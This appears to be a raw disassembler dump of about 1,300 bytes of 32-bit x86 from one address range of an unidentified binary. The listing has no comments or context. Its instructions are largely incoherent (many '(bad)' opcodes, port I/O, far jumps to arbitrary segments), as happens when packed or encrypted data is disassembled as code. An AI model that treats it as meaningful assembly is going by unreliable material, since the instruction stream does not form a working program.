  41ce4d:	add    BYTE PTR [ecx-0x77],dh
  41ce50:	test   al,0xb
  41ce52:	(bad)  
  41ce53:	push   esi
  41ce54:	addr16 xchg ebx,eax
  41ce56:	cli    
  41ce57:	adc    ecx,DWORD PTR [ecx]
  41ce59:	inc    esp
  41ce5a:	lahf   
  41ce5b:	enter  0xa7e6,0x26
  41ce5f:	das    
  41ce60:	sbb    eax,0xd47f47c4
  41ce65:	cmc    
  41ce66:	mov    esi,0x37641b10
  41ce6b:	sbb    BYTE PTR [ecx+0x77],ch
  41ce6e:	aam    0xcd
  41ce70:	jbe    0x41ce42
  41ce72:	outs   dx,DWORD PTR ds:[esi]
  41ce73:	xchg   edi,eax
  41ce74:	ror    BYTE PTR [edi+0x1cc84639],1
  41ce7a:	mov    al,0xed
  41ce7c:	jo     0x41ce42
  41ce7e:	sub    ah,cl
  41ce80:	pop    eax
  41ce81:	out    0x1e,eax
  41ce83:	adc    al,0x8e
  41ce85:	cmp    eax,0x4c7864f
  41ce8a:	jl     0x41cecd
  41ce8c:	xchg   ebx,eax
  41ce8d:	aad    0x71
  41ce8f:	dec    esi
  41ce90:	sbb    dh,BYTE PTR [edx-0xab251de]
  41ce96:	mov    edx,0xbce126c4
  41ce9b:	outs   dx,DWORD PTR ds:[esi]
  41ce9c:	fbstp  TBYTE PTR fs:[edi+edi*4]
  41cea0:	xor    BYTE PTR [ecx],al
  41cea2:	popa   
  41cea3:	rcr    BYTE PTR [ebx-0x75],1
  41cea6:	mov    al,0xc
  41cea8:	inc    ebp
  41cea9:	adc    eax,0xc778d6e6
  41ceae:	aaa    
  41ceaf:	stc    
  41ceb0:	push   ss
  41ceb1:	aam    0xa
  41ceb3:	popf   
  41ceb4:	push   DWORD PTR [edx+edx*8]
  41ceb7:	test   BYTE PTR [eax+esi*4+0x586a5544],dl
  41cebe:	jg     0x41cecd
  41cec0:	mov    edx,0xc106b043
  41cec5:	push   cs
  41cec6:	xor    DWORD PTR [edi+eiz*8+0x23],0x0
  41cecb:	icebp  
  41cecc:	add    eax,esi
  41cece:	push   edi
  41cecf:	ror    BYTE PTR [esi+ecx*1-0x3d739abd],1
  41ced6:	mov    ds:0x2ca49f4b,eax
  41cedb:	(bad)  
  41cedc:	rol    BYTE PTR [eax-0x4e],1
  41cedf:	loope  0x41ced7
  41cee1:	sbb    BYTE PTR ds:0x79282f36,bh
  41cee7:	sbb    BYTE PTR [esi+0x42],0xe6
  41ceeb:	mov    ebx,0xafec50e
  41cef0:	(bad)  
  41cef1:	sti    
  41cef2:	mov    cs,WORD PTR [ecx]
  41cef4:	cs das 
  41cef6:	pop    es
  41cef7:	ja     0x41ceb2
  41cef9:	push   ds
  41cefa:	dec    edi
  41cefb:	addr16 jmp 0xd4bcf7a3
  41cf01:	shl    edi,0xac
  41cf04:	les    edx,FWORD PTR [edi-0x4c]
  41cf07:	(bad)  [edx-0x17]
  41cf0a:	bound  ebp,QWORD PTR [edx+0x56e5ad60]
  41cf10:	(bad)  
  41cf11:	mov    BYTE PTR [esi-0x2d0833e7],dl
  41cf17:	xor    al,0xd2
  41cf19:	mov    cs,edi
  41cf1b:	popa   
  41cf1c:	sbb    edi,DWORD PTR [ecx+0x7]
  41cf1f:	xlat   BYTE PTR ds:[ebx]
  41cf20:	and    DWORD PTR [ecx+0x34318e37],esp
  41cf26:	jl     0x41cf8f
  41cf28:	js     0x601360a6
  41cf2e:	sub    DWORD PTR [eax],ebx
  41cf30:	and    eax,DWORD PTR [esi]
  41cf32:	(bad)  
  41cf33:	ret    
  41cf34:	in     eax,0x25
  41cf36:	mov    dl,0x3f
  41cf38:	mov    ds:0x5daa2727,eax
  41cf3d:	and    ch,bl
  41cf3f:	xor    ah,BYTE PTR [ecx+esi*1+0x25]
  41cf43:	and    esp,DWORD PTR [edx]
  41cf45:	mov    bh,0xba
  41cf47:	sar    DWORD PTR [esi-0x5a],cl
  41cf4a:	inc    BYTE PTR [edx+0x1e0359a0]
  41cf50:	mov    cs,WORD PTR [ecx+ebx*8]
  41cf53:	out    0xa5,al
  41cf55:	pushf  
  41cf56:	mov    cl,0xf3
  41cf58:	in     al,0xc4
  41cf5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf5b:	imul   ecx,DWORD PTR [eax-0x3e],0xffffffbb
  41cf5f:	popf   
  41cf60:	dec    ebp
  41cf61:	inc    ecx
  41cf62:	xchg   edi,eax
  41cf63:	out    0x47,eax
  41cf65:	pop    ebx
  41cf66:	les    edi,FWORD PTR [ebx-0x10]
  41cf69:	jmp    0x2117:0x7dba138b
  41cf70:	shr    bl,1
  41cf72:	das    
  41cf73:	cmp    DWORD PTR [ecx],0xc8cbaf65
  41cf79:	fldl2e 
  41cf7b:	xchg   edx,eax
  41cf7c:	mov    ss,WORD PTR [esp+ebx*4]
  41cf7f:	dec    eax
  41cf80:	cdq    
  41cf81:	gs enter 0xaa8b,0x94
  41cf86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf88:	push   edi
  41cf89:	mov    ch,0x4e
  41cf8b:	sub    al,0x34
  41cf8d:	in     al,0xac
  41cf8f:	push   ds
  41cf90:	mov    DWORD PTR [ebp-0x14],esp
  41cf93:	es adc ebx,edi
  41cf96:	push   esp
  41cf98:	ret    
  41cf99:	mov    esp,0x6ca79443
  41cf9e:	xchg   ebp,eax
  41cf9f:	or     al,BYTE PTR [ebx]
  41cfa1:	cmp    eax,0xcd643166
  41cfa6:	push   edi
  41cfa7:	repz dec esi
  41cfa9:	inc    ebx
  41cfaa:	and    edi,esp
  41cfac:	fnstenv [ebx+0x247d570e]
  41cfb2:	xchg   ebx,eax
  41cfb3:	jo     0x41cf83
  41cfb5:	add    al,0xb
  41cfb7:	imul   eax,DWORD PTR ds:0xac573d82,0x63d5f949
  41cfc1:	inc    ebp
  41cfc2:	into   
  41cfc3:	outs   dx,DWORD PTR ds:[esi]
  41cfc4:	cmp    ch,BYTE PTR [ebp+0x45fff86a]
  41cfca:	xor    al,0x74
  41cfcc:	add    edi,DWORD PTR [edi-0x41]
  41cfcf:	mov    ah,0x19
  41cfd1:	clc    
  41cfd2:	pop    ecx
  41cfd3:	ror    BYTE PTR es:[edx-0x116b09f6],1
  41cfda:	pop    ebx
  41cfdb:	or     DWORD PTR [ebp-0x75],ebp
  41cfde:	xchg   esi,eax
  41cfdf:	xor    dh,BYTE PTR [eax+0x2741fd6d]
  41cfe5:	inc    eax
  41cfe6:	scas   eax,DWORD PTR es:[edi]
  41cfe7:	sub    eax,0x68f2050
  41cfec:	js     0x41cfe8
  41cfee:	dec    eax
  41cfef:	aam    0x8d
  41cff1:	cmp    eax,0x15a86544
  41cff6:	sub    al,BYTE PTR [eax+edi*1+0x1c]
	...
  41d006:	add    BYTE PTR [ebx-0x1e],dl
  41d009:	call   0xd4f6:0xff7dbb65
  41d010:	mov    WORD PTR [edi],ds
  41d012:	fisubr DWORD PTR [edi+0xd]
  41d015:	mov    BYTE PTR ds:0x19e61,bh
  41d01b:	sub    eax,DWORD PTR [edx]
  41d01d:	add    BYTE PTR [eax],al
  41d01f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d020:	push   ecx
  41d021:	aas    
  41d022:	dec    esi
  41d023:	sub    ch,BYTE PTR [ecx+0x19fdcb01]
  41d029:	push   0xffffffd8
  41d02b:	xor    BYTE PTR [ecx-0x2e],ch
  41d02e:	in     eax,dx
  41d02f:	xchg   esi,eax
  41d030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d031:	je     0x41d0aa
  41d033:	push   ecx
  41d034:	jp     0x41d020
  41d036:	les    esp,FWORD PTR [ecx-0x3a4e08d]
  41d03c:	mov    dh,0x82
  41d03e:	pop    eax
  41d03f:	and    al,0xf7
  41d041:	pop    edx
  41d042:	inc    BYTE PTR fs:[esi-0x4dd12696]
  41d049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d04a:	in     al,dx
  41d04b:	inc    esp
  41d04c:	inc    edx
  41d04d:	xchg   edi,eax
  41d04e:	dec    ebx
  41d04f:	test   al,0x69
  41d051:	xor    DWORD PTR [edx],esi
  41d053:	sbb    DWORD PTR [ecx],ebx
  41d055:	int3   
  41d056:	adc    esi,DWORD PTR [ebp-0x33156a34]
  41d05c:	ja     0x41d067
  41d05e:	xchg   ebx,eax
  41d05f:	xlat   BYTE PTR ds:[ebx]
  41d060:	fmul   st,st(6)
  41d062:	xchg   ecx,eax
  41d063:	dec    eax
  41d064:	sar    DWORD PTR [esi],0x63
  41d067:	aam    0xe8
  41d069:	(bad)  
  41d06b:	push   es
  41d06c:	add    BYTE PTR [edi],dh
  41d06e:	and    eax,0x860ffb52
  41d073:	test   BYTE PTR [ebx+0x23d1192d],0xf2
  41d07a:	sub    DWORD PTR [ebx],0x6d
  41d07d:	int3   
  41d07e:	push   cs
  41d07f:	repnz inc edi
  41d081:	lods   al,BYTE PTR ds:[esi]
  41d082:	loope  0x41d009
  41d084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d085:	pop    ss
  41d086:	rcr    DWORD PTR [esp+ebp*4-0x7c4606e6],0x35
  41d08e:	pop    eax
  41d08f:	inc    sp
  41d091:	imul   edi,DWORD PTR [esi-0x44c8055e],0xffffffd8
  41d098:	jb     0x41d070
  41d09a:	dec    eax
  41d09b:	pop    ss
  41d09c:	je     0x41d02a
  41d09e:	rol    BYTE PTR [edi-0x48],cl
  41d0a1:	push   ecx
  41d0a2:	pop    esp
  41d0a3:	outs   dx,BYTE PTR ds:[esi]
  41d0a4:	das    
  41d0a5:	es out 0xf4,eax
  41d0a8:	mov    dh,BYTE PTR [ebx+0x0]
  41d0ab:	jecxz  0x41d0c3
  41d0ad:	pop    esp
  41d0ae:	cmp    esp,DWORD PTR [esi-0x25]
  41d0b1:	lods   al,BYTE PTR ds:[esi]
  41d0b2:	(bad)  
  41d0b3:	cld    
  41d0b4:	mov    dl,BYTE PTR [esp+ecx*8+0x5b6e38f9]
  41d0bb:	out    dx,al
  41d0bc:	in     eax,0xb7
  41d0be:	jmp    0x41d047
  41d0c0:	push   0x9446c4ec
  41d0c5:	mov    edx,0x9f0a87b5
  41d0cb:	(bad)  
  41d0cc:	cwde   
  41d0cd:	push   0x1b147c6b
  41d0d2:	xchg   edx,eax
  41d0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0d4:	pusha  
  41d0d5:	cli    
  41d0d6:	mov    dl,0x24
  41d0d8:	(bad)  
  41d0da:	xchg   esi,eax
  41d0db:	jecxz  0x41d10d
  41d0dd:	in     eax,0x90
  41d0df:	in     al,dx
  41d0e0:	dec    esi
  41d0e1:	pop    edx
  41d0e2:	mov    BYTE PTR [ecx-0x5c],cl
  41d0e5:	add    al,0xcf
  41d0e7:	jmp    0x41d086
  41d0e9:	sub    ebx,DWORD PTR [ebx-0x479b3555]
  41d0ef:	jno    0x41d157
  41d0f1:	stos   DWORD PTR es:[edi],eax
  41d0f2:	test   BYTE PTR [ecx],dl
  41d0f4:	xor    al,bh
  41d0f6:	mov    dl,0x44
  41d0f8:	cs clc 
  41d0fa:	icebp  
  41d0fb:	in     al,dx
  41d0fc:	das    
  41d0fd:	jmp    0x41d13c
  41d0ff:	and    dl,BYTE PTR [edi+0x8447370]
  41d105:	add    BYTE PTR [eax-0x53],al
  41d108:	cmp    DWORD PTR [edi+0x66],esi
  41d10b:	cs xchg edx,eax
  41d10d:	(bad)  
  41d10e:	arpl   WORD PTR [ebp+0x3be5012d],si
  41d114:	int    0x84
  41d116:	mov    bh,0xef
  41d118:	bound  esi,QWORD PTR [ebx-0x6d]
  41d11b:	jne    0x41d0c0
  41d11d:	add    BYTE PTR [edi+0x1331e450],dh
  41d123:	lock push edx
  41d125:	xchg   ebx,eax
  41d126:	bound  ebx,QWORD PTR [esi+esi*8-0x6b]
  41d12a:	xor    BYTE PTR [edx],0x99
  41d12d:	sbb    BYTE PTR [ecx],bl
  41d12f:	xchg   ebp,eax
  41d130:	mov    dl,0xef
  41d132:	sti    
  41d133:	fst    QWORD PTR [edi+ebp*4-0x57]
  41d137:	jae    0x41d191
  41d139:	fsubr  QWORD PTR [esi]
  41d13b:	clc    
  41d13c:	outs   dx,DWORD PTR ds:[esi]
  41d13d:	mov    dh,0xe3
  41d13f:	call   0x45dab4e3
  41d144:	call   0x7528:0x1669a5bc
  41d14b:	mov    bh,0xe6
  41d14d:	addr16 jge 0x41d1cd
  41d150:	inc    edi
  41d151:	inc    edi
  41d152:	aaa    
  41d153:	and    ebp,edi
  41d155:	mov    ebp,0xd27e30cc
  41d15a:	mov    ebp,0xe89c391a
  41d15f:	fiadd  WORD PTR [ebp+edi*2-0x6fe71635]
  41d166:	cld    
  41d167:	pop    edx
  41d168:	aad    0x4c
  41d16a:	pop    eax
  41d16b:	cli    
  41d16c:	xor    eax,0x540b4222
  41d171:	outs   dx,DWORD PTR ds:[esi]
  41d172:	scas   eax,DWORD PTR es:[edi]
  41d173:	pop    es
  41d174:	push   edx
  41d175:	xlat   BYTE PTR ds:[ebx]
  41d176:	mov    dl,0x9f
  41d178:	(bad)  
  41d179:	xchg   ebx,eax
  41d17a:	mov    DWORD PTR [esi+0x74],edi
  41d17d:	or     eax,0xed821d26
  41d182:	arpl   bx,cx
  41d184:	push   ecx
  41d185:	cmp    bh,BYTE PTR [edi-0x7a]
  41d188:	push   eax
  41d189:	or     dh,BYTE PTR [ebx-0x36]
  41d18c:	retf   
  41d18d:	shl    DWORD PTR [edx-0x43],cl
  41d190:	mov    ebp,0x117f040d
  41d195:	adc    ebx,DWORD PTR [edx-0x7e5d4e05]
  41d19b:	repnz cmp esi,eax
  41d19e:	ins    BYTE PTR es:[edi],dx
  41d19f:	outs   dx,BYTE PTR ds:[esi]
  41d1a0:	pop    ds
  41d1a1:	scas   al,BYTE PTR es:[edi]
  41d1a2:	sub    DWORD PTR [ebx-0x2e6a984c],0x6bd02c32
  41d1ac:	sub    eax,0xc76440c4
  41d1b1:	call   0x9c1b:0x11864e58
  41d1b8:	and    eax,0x193bda71
  41d1bd:	cli    
  41d1be:	xchg   ecx,eax
  41d1bf:	xor    eax,0xf2738e5c
  41d1c4:	dec    ebp
  41d1c5:	adc    DWORD PTR [esi],0x73
  41d1c8:	idiv   BYTE PTR [esi-0x4a2c34ed]
  41d1ce:	call   edx
  41d1d0:	adc    edx,ecx
  41d1d2:	cmp    DWORD PTR [ebp+0x19],esi
  41d1d5:	in     eax,0x4f
  41d1d7:	loop   0x41d177
  41d1d9:	les    ecx,FWORD PTR [edi+ebp*8]
  41d1dc:	aad    0xd5
  41d1de:	cs xchg ebp,eax
  41d1e0:	ja     0x41d1a0
  41d1e2:	out    dx,al
  41d1e3:	stos   BYTE PTR es:[edi],al
  41d1e4:	xchg   DWORD PTR [edi-0x53],eax
  41d1e7:	inc    edx
  41d1e8:	mov    ebx,DWORD PTR [edx+0x1fb07dea]
  41d1ee:	popa   
  41d1ef:	jle    0x41d17e
  41d1f1:	jne    0x41d206
  41d1f3:	inc    esi
  41d1f4:	ss loope 0x41d189
  41d1f7:	dec    esi
  41d1f8:	push   0xffffffa0
  41d1fa:	adc    esi,ecx
  41d1fc:	call   0xab33:0x23ba0ca
  41d203:	mov    esp,0x2e63d9dc
  41d208:	cmp    DWORD PTR [esi+edi*8-0x7c],esi
  41d20c:	retf   0x3705
  41d20f:	cmp    DWORD PTR ds:[edi],ebx
  41d212:	div    BYTE PTR [ecx]
  41d214:	shr    DWORD PTR [ebx],cl
  41d216:	adc    eax,0xc6b1db3b
  41d21b:	xchg   esp,eax
  41d21c:	loop   0x41d227
  41d21e:	jg     0x41d20a
  41d220:	out    dx,eax
  41d221:	lds    esp,FWORD PTR [ebp-0x7]
  41d224:	inc    ebp
  41d225:	or     edi,DWORD PTR [edx+0x3d]
  41d228:	pop    ds
  41d229:	add    BYTE PTR ds:0x558c5427,dl
  41d22f:	dec    ebx
  41d230:	jp     0x41d1c8
  41d232:	hlt    
  41d233:	aas    
  41d234:	push   edx
  41d235:	dec    esi
  41d236:	in     eax,0x4e
  41d238:	adc    DWORD PTR [esi],ecx
  41d23a:	loop   0x41d1de
  41d23c:	push   esi
  41d23d:	popa   
  41d23e:	std    
  41d23f:	arpl   WORD PTR [eax+edi*8-0x40],bp
  41d243:	into   
  41d244:	jbe    0x41d236
  41d246:	ins    DWORD PTR es:[edi],dx
  41d247:	mov    bl,0xa9
  41d249:	add    BYTE PTR ds:[eax],al
	...
  41d254:	add    BYTE PTR [eax],al
  41d256:	add    dh,al
  41d258:	push   esi
  41d259:	mov    ebp,0xc6ffbdfd
  41d25e:	jg     0x41d28a
  41d260:	inc    eax
  41d261:	int3   
  41d262:	aad    0x13
  41d264:	call   0x1:0xa08cf14e
  41d26b:	sub    eax,DWORD PTR [edx]
  41d26d:	add    BYTE PTR [eax],al
  41d26f:	ret    0x8c10
  41d272:	jns    0x41d297
  41d274:	xchg   DWORD PTR [edi-0x74b09646],esp
  41d27a:	out    0xd,al
  41d27c:	fnsetpm(287 only) 
  41d27e:	repz out dx,eax
  41d280:	pop    esp
  41d281:	mov    cl,0xf3
  41d283:	cmp    DWORD PTR [edx+0x4d],esp
  41d286:	mov    esp,0xccaf8f6c
  41d28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d28c:	iret   
  41d28d:	addr16 sbb al,0x27
  41d290:	dec    esp
  41d291:	mov    WORD PTR [eax+0xa],?
  41d294:	cmp    BYTE PTR [edi-0x5002835f],0x3f
  41d29b:	xchg   edi,eax
  41d29c:	jns    0x41d318
  41d29e:	pop    esi
  41d29f:	test   DWORD PTR [edi-0x71],edi
  41d2a2:	mov    DWORD PTR [esi-0x7934c444],ecx
  41d2a8:	aam    0x88
  41d2aa:	ins    BYTE PTR es:[edi],dx
  41d2ab:	pop    es
  41d2ac:	nop
  41d2ad:	pop    ebp
  41d2ae:	mov    eax,ds:0x4c1939
  41d2b3:	adc    BYTE PTR [esi+eiz*8+0xe],ah
  41d2b7:	fisub  DWORD PTR [eax]
  41d2b9:	and    BYTE PTR [eax],0x6f
  41d2bc:	dec    ebp
  41d2bd:	add    BYTE PTR [eax],0xab
  41d2c0:	push   ebx
  41d2c1:	das    
  41d2c2:	aaa    
  41d2c3:	enter  0x34ed,0x79
  41d2c7:	icebp  
  41d2c8:	lods   eax,DWORD PTR ds:[esi]
  41d2c9:	aas    
  41d2ca:	ds int 0x7e
  41d2cd:	fild   DWORD PTR [edi]
  41d2cf:	je     0x41d29e
  41d2d1:	cmc    
  41d2d2:	mov    eax,ds:0xeab09946
  41d2d7:	cld    
  41d2d8:	pop    edx
  41d2d9:	or     ch,bh
  41d2db:	out    dx,eax
  41d2dc:	sub    DWORD PTR [edi],0xfffffff9
  41d2df:	les    esp,FWORD PTR [ecx-0x724a632d]
  41d2e5:	into   
  41d2e6:	mov    bl,0xb8
  41d2e8:	or     al,BYTE PTR [esi]
  41d2ea:	imul   edi,DWORD PTR [eax],0xffffffe4
  41d2ed:	cmp    DWORD PTR [edx+0x5e1d3271],esp
  41d2f3:	cmp    eax,0x52853bb6
  41d2f8:	mov    ch,0xe1
  41d2fa:	in     al,dx
  41d2fb:	jns    0x41d291
  41d2fd:	push   edx
  41d2fe:	cdq    
  41d2ff:	push   esp
  41d300:	push   edi
  41d301:	mov    esi,0xa1fa54be
  41d306:	adc    DWORD PTR [esi-0x3a],ebx
  41d309:	jmp    0x41d360
  41d30b:	hlt    
  41d30c:	push   ecx
  41d30d:	inc    ecx
  41d30e:	or     eax,0x7816e7ec
  41d313:	lea    eax,[esi-0x5b9da06e]
  41d319:	imul   DWORD PTR [edx+eiz*8+0x2ac4149]
  41d320:	mov    al,ds:0x128dbc11
  41d325:	sub    BYTE PTR [esi+ecx*8+0x35],dl
  41d329:	shl    DWORD PTR [edx+0x5],0x49
  41d32d:	stos   BYTE PTR es:[edi],al
  41d32e:	in     eax,0xb5
  41d330:	mov    bh,0x9a
  41d332:	jg     0x41d35a
  41d334:	add    DWORD PTR [edx+eiz*1],edx
  41d337:	mov    edi,0xa509aba2
  41d33c:	cwde   
  41d33d:	std    
  41d33e:	adc    DWORD PTR [eax],edx
  41d340:	jae    0x41d31f
  41d342:	aas    
  41d343:	inc    ebp
  41d344:	add    esi,DWORD PTR [eax+0x5390ca70]
  41d34a:	push   0x43
  41d34c:	push   ebx
  41d34d:	xchg   edx,eax
  41d34e:	rol    DWORD PTR [ebp-0x25],cl
  41d351:	xor    ch,ah
  41d353:	aas    
  41d354:	mov    esp,0xa56d5897
  41d359:	pop    edx
  41d35a:	stos   DWORD PTR es:[edi],eax
  41d35b:	(bad)  
  41d35c:	pop    ss
  41d35d:	and    eax,0x82396660
  41d362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d363:	push   ebp
  41d364:	xor    DWORD PTR [ebx-0x70],edi
  41d367:	sbb    BYTE PTR [edi],0x61
  41d36a:	loopne 0x41d3e6
  41d36c:	sub    BYTE PTR [ebx+0x30cab9a],dl
  41d372:	xor    cl,bl
  41d374:	push   cs
  41d375:	adc    al,BYTE PTR [ecx+0x68]
  41d378:	ret    0x1c5b
  41d37b:	sub    ch,BYTE PTR cs:[eax+0x5933bbc1]
  41d382:	dec    ecx
  41d383:	mov    dh,0x4c
  41d385:	outs   dx,DWORD PTR ds:[esi]
  41d386:	call   0x768a78a1
  41d38b:	call   0xfd68:0xda1af2e3
  41d392:	cmc    
  41d393:	imul   esi,DWORD PTR [esi],0x7
  41d396:	push   edx
  41d397:	jle    0x41d334
  41d399:	shl    ecx,0x63
  41d39c:	pop    ds
  41d39d:	inc    ecx
  41d39e:	mov    WORD PTR [edx+0x69aff376],fs
  41d3a4:	fsub   QWORD PTR [eax-0x4f]
  41d3a7:	rcr    BYTE PTR [esi-0x88cb0dd],1
  41d3ad:	std    
  41d3ae:	fisubr WORD PTR [eax]
  41d3b0:	ffreep st(4)
  41d3b2:	or     esp,DWORD PTR [esi]
  41d3b4:	mov    eax,ds:0xe0b34abc
  41d3b9:	fadd   st,st(7)
  41d3bb:	cmp    al,BYTE PTR [ebp+0x3ee0e3d9]
  41d3c1:	imul   ecx,DWORD PTR [edi-0x581b07e5],0x13ad8519
  41d3cb:	mov    ?,eax
  41d3cd:	sub    DWORD PTR [ebp-0x18],esi
  41d3d0:	adc    al,0x39
  41d3d2:	sahf   
  41d3d3:	mov    edx,0x44b56a58
  41d3d8:	dec    edi
  41d3d9:	loopne 0x41d445
  41d3db:	adc    BYTE PTR [esi+0x6173843c],ah
  41d3e1:	xchg   ebx,eax
  41d3e2:	js     0x41d36b
  41d3e4:	aad    0x2c
  41d3e6:	pop    ss
  41d3e7:	adc    edx,esi
  41d3e9:	cwde   
  41d3ea:	inc    ecx
  41d3eb:	adc    edx,eax
  41d3ed:	inc    ebp
  41d3ee:	ja     0x41d3c6
  41d3f0:	xchg   ebx,eax
  41d3f1:	or     eax,0xd9cb0a74
  41d3f6:	jmp    0x41d3ef
  41d3f8:	inc    ebx
  41d3f9:	mov    BYTE PTR [edi-0x4d],ch
  41d3fc:	les    esp,FWORD PTR [ebp+0x6c]
  41d3ff:	mov    al,ds:0xc5f7f28
  41d404:	stc    
  41d405:	mov    dh,0x24
  41d407:	cmp    al,BYTE PTR [eax]
  41d409:	out    dx,al
  41d40a:	pop    esp
  41d40b:	inc    ecx
  41d40c:	pop    edi
  41d40d:	out    0xc,al
  41d40f:	mov    ds:0x10733813,al
  41d414:	(bad)  
  41d416:	mov    cl,0xef
  41d418:	inc    ecx
  41d419:	mov    DWORD PTR [ebx],esp
  41d41b:	inc    esp
  41d41c:	mov    eax,ds:0xa302f57c
  41d421:	and    DWORD PTR [edx+0x565787cf],0xa247883a
  41d42b:	pop    esi
  41d42c:	stc    
  41d42d:	jmp    0x41d454
  41d42f:	sub    eax,DWORD PTR [edi+esi*4+0x1880494c]
  41d436:	lock fadd DWORD PTR [eax+0x31796faa]
  41d43d:	int3   
  41d43e:	sbb    DWORD PTR [edi-0x7f831205],eax
  41d444:	xlat   BYTE PTR ds:[ebx]
  41d445:	sub    BYTE PTR [esi-0x28d8e582],0xa8
  41d44c:	jbe    0x41d3f6
  41d44e:	call   FWORD PTR [ebx+0x73]
  41d451:	xchg   edx,eax
  41d452:	adc    eax,edx
  41d454:	pop    esi
  41d455:	test   al,0xc9
  41d457:	add    al,0x9f
  41d459:	nop
  41d45a:	pop    es
  41d45b:	repnz cmp DWORD PTR [edi-0x25dbac16],ecx
  41d462:	mov    ch,0x38
  41d464:	push   edx
  41d465:	fisubr WORD PTR [ecx-0x40]
  41d468:	cmp    eax,0x92636b3a
  41d46d:	mov    esp,0xe2cf7322
  41d472:	pusha  
  41d473:	mov    esp,0xd02a8f69
  41d478:	sbb    DWORD PTR [esi],eax
  41d47a:	inc    ch
  41d47c:	push   ds
  41d47d:	les    esp,FWORD PTR [ecx-0x5c3ebac8]
  41d483:	pop    esi
  41d484:	jno    0x41d4e3
  41d486:	rol    BYTE PTR [edi],cl
  41d488:	sub    al,0x35
  41d48a:	add    bh,BYTE PTR [edx-0x41]
  41d48d:	fsub   st,st(2)
  41d48f:	pushf  
  41d490:	fidivr DWORD PTR [edx+0x6a]
  41d493:	out    dx,al
  41d494:	pop    eax
  41d495:	xchg   edx,eax
  41d496:	xchg   esi,eax
  41d497:	xchg   ecx,eax
  41d498:	mov    edx,0xe3
	...
  41d4a5:	add    BYTE PTR [eax],al
  41d4a7:	pop    ds
  41d4a8:	arpl   si,ax
  41d4aa:	dec    ebp
  41d4ab:	(bad)  
  41d4ac:	in     eax,dx
  41d4ad:	lahf   
  41d4ae:	jae    0x41d499
  41d4b0:	xchg   ebx,eax
  41d4b1:	jg     0x41d48b
  41d4b3:	mov    esp,0xb7ec579d
  41d4b8:	mov    ds:0x22b0001,al
  41d4bd:	add    BYTE PTR [eax],al
  41d4bf:	mov    dl,al
  41d4c1:	jno    0x41d508
  41d4c3:	ins    BYTE PTR es:[edi],dx
  41d4c4:	mov    ebx,0xf120b841
  41d4c9:	sbb    edx,DWORD PTR [ebp-0x181e0130]
  41d4cf:	js     0x41d497
  41d4d1:	sub    DWORD PTR [esi],ebx
  41d4d3:	or     al,0x6
  41d4d5:	retf   0xf38b
  41d4d8:	call   0xeee87a7e
  41d4dd:	xchg   ecx,eax
  41d4de:	cmc    
  41d4df:	push   eax
  41d4e0:	inc    eax
  41d4e1:	xchg   esi,eax
  41d4e2:	vmread DWORD PTR [ebx-0x38],ecx
  41d4e6:	fs xchg esi,eax
  41d4e8:	jge    0x41d54f
  41d4ea:	enter  0x4a9b,0x94
  41d4ee:	outs   dx,BYTE PTR ds:[esi]
  41d4ef:	loopne 0x41d48c
  41d4f1:	ins    BYTE PTR es:[edi],dx
  41d4f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4f3:	jb     0x41d538
  41d4f5:	inc    edx
  41d4f6:	and    al,0x28
  41d4f8:	frstor [esi-0x19]
  41d4fb:	push   ss
  41d4fc:	mov    dh,BYTE PTR [esi+eax*2+0x1c566075]
  41d503:	mov    dh,0x90
  41d505:	mov    dh,0x3e
  41d507:	jmp    0x41d4a3
  41d509:	adc    al,0x1b
  41d50b:	ror    DWORD PTR [ecx],1
  41d50d:	xor    eax,0xdb2dfa86
  41d512:	std    
  41d513:	xchg   edx,eax
  41d514:	jge    0x41d58c
  41d516:	inc    edx
  41d517:	inc    eax
  41d518:	xchg   edx,eax
  41d519:	and    bh,BYTE PTR [ecx]
  41d51b:	sub    dl,BYTE PTR [eax+0x14]
  41d51e:	jmp    0x41d59a
  41d520:	ins    BYTE PTR es:[edi],dx
  41d521:	repnz out dx,eax
  41d523:	inc    edx
  41d524:	test   dh,bl
  41d526:	sbb    esp,ebp
  41d528:	jle    0x41d4d8
  41d52a:	xor    BYTE PTR [ecx-0x33],al
  41d52d:	gs cmp al,0x46
  41d530:	outs   dx,BYTE PTR ds:[esi]
  41d531:	stc    
  41d532:	(bad)  
  41d533:	int    0xc9
  41d535:	pop    ss
  41d536:	inc    eax
  41d537:	dec    DWORD PTR [esi-0x774ba553]
  41d53d:	retf   
  41d53e:	dec    esp
  41d53f:	bound  esi,QWORD PTR [ecx-0x3d]
  41d542:	push   ds
  41d543:	pushf  
  41d544:	sub    esi,DWORD PTR [eax+edi*4+0x27]
  41d548:	loop   0x41d5c5
  41d54a:	out    0x80,al
  41d54c:	mov    ecx,DWORD PTR ds:0xa8d06e9b
  41d552:	ins    BYTE PTR es:[edi],dx
  41d553:	mov    dl,cl
  41d555:	sbb    DWORD PTR [esi+edi*2],edx
  41d558:	mov    ss,WORD PTR [edi+0x4a490a5a]
  41d55e:	inc    ebx
  41d55f:	ret    
  41d560:	mov    ch,0x7e
  41d562:	push   ecx
  41d563:	jle    0x41d547
  41d565:	out    dx,al
  41d566:	(bad)  
  41d567:	pop    ss
  41d568:	jns    0x41d529
  41d56a:	xor    cl,dh
  41d56c:	test   al,0x75
  41d56e:	mov    eax,0xcf7fb77c
  41d573:	aas    
  41d574:	daa    
  41d575:	test   cl,ah
  41d577:	imul   edi,DWORD PTR [esi+0x6],0x419646da
  41d57e:	dec    ebx
  41d57f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d580:	lods   al,BYTE PTR ds:[esi]
  41d581:	mov    edi,0x879ba775
  41d586:	leave  
  41d587:	or     DWORD PTR [edx],edx
  41d589:	xlat   BYTE PTR ds:[ebx]
  41d58a:	mov    dh,0xd7
  41d58c:	hlt    
  41d58d:	(bad)  
  41d58e:	mov    bh,0xa4
  41d590:	pop    ecx
  41d591:	sahf   
  41d592:	mov    esi,0x357ec3e4
